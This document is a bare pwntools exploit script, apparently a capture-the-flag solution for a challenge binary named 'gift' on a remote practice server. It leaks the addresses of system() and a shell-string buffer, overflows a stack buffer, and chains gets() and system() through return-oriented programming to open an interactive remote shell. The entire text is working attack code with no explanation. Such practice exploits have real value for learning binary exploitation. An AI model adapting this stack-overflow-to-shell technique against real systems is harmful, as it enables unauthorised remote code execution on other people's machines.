from pwn import *

#p = process('./gift')
p = remote('ctf.j0n9hyun.xyz', 3018)
e = ELF('./gift')
pause()
context.log_level = "debug"

p_r = 0x0804866b
gets = 0x80483d0

payload = 'a' *0x84 + 'b' * 4

p.recvuntil(': ')
sh = (int(p.recv(9),16))
p.recv(1)
sys =(int(p.recv(10),16))

log.info('binsh : ' + hex(sh))
log.info('system : ' + hex(sys))

p.recv()
p.sendline('a')

payload += p32(gets)
payload += p32(p_r)
payload += p32(sh)

payload += p32(sys)
payload += 'a' * 4
payload += p32(sh)

p.sendline(payload)
p.sendline('sh\x00')

p.interactive()
